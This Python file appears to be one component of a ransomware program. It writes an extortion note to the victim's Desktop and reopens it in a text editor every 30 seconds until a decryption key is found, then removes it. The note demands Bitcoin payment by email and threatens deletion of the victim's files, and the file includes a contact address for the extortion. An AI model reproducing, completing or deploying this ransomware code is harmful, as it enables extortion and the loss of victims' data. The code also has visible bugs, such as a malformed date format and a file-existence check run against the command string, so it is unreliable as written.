import os
import time
import datetime
import ransomware
import globals

def gen_ransomNote():
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('/home/ubuntu/Desktop/RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!
To purchase your key and restore your data, please follow these three easy steps:
1. Email the file called EMAIL_ME.txt at Desktop/EMAIL_ME.txt to sreesk3@gmail.com
2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to sreesk3@gmail.com stating "PAID".
   We will check to see if payment has been paid.
3. You will receive a text file with your KEY(dec_aesKey.txt) that will unlock all your files via mail. 
   IMPORTANT: To decrypt your files, place text file in the infected folder and wait. Shortly after it will begin to decrypt all files.
WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')

def show_ransomNote():
   cmd = 'gedit /home/ubuntu/Desktop/RANSOM_NOTE.txt &'

   while not globals.found_key:
      if not os.path.exists('gedit /home/ubuntu/Desktop/RANSOM_NOTE.txt &'):
         gen_ransomNote()

      os.system(cmd)
      time.sleep(30)

   cmd2 = 'rm /home/ubuntu/Desktop/RANSOM_NOTE.txt'
   os.system(cmd2)